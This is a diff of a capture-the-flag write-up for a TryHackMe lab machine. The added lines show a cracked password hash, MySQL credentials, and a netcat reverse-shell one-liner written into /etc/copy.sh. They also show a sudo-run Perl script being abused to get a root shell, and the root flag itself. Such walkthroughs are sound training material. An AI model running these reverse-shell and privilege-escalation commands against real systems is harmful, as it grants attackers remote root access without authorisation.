@@ -125,7 +125,7 @@ Looking further, we see that there is a mysql_backup folder and we will try to o
 Opening up the file, we can see that there are lying credentials on the file:
 
 username: manager
-password: hashed pw
+password: hashed pw | 42f749ade7f9e195bf475f37a44cafcb
 
 
 ![[Pasted image 20220819220959.png]]
@@ -241,12 +241,40 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.167 5554 >/t
 
 ```
 
+After that we run our reverse shell using sudo commands
+
+```
+www-data@THM-Chal:/home/itguy$ perl /home/itguy/backup.pl
+rm: cannot remove '/tmp/f': No such file or directory
+www-data@THM-Chal:/home/itguy$ cd ..
+www-data@THM-Chal:/home$ sudo /home/itguy/backup.pl
+[sudo] password for www-data: 
+www-data@THM-Chal:/home$ sudo perl /home/itguy/backup.pl
+
+
+```
+
+On the listening side:
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/LazyAdmin]
+└─$ nc -lnvp 5554
+listening on [any] 5554 ...
+connect to [10.4.73.167] from (UNKNOWN) [10.10.35.168] 50124
+# whoami
+root
+# cat /root/root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+# 
+
+```
 
 admin: manager
 passwd : 42f749ade7f9e195bf475f37a44cafcb | Password123
 
-
+Mysql credentials:
 rice:randompass
 
-
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.167 5555 >/tmp/f" > /etc/copy.sh
+
+END
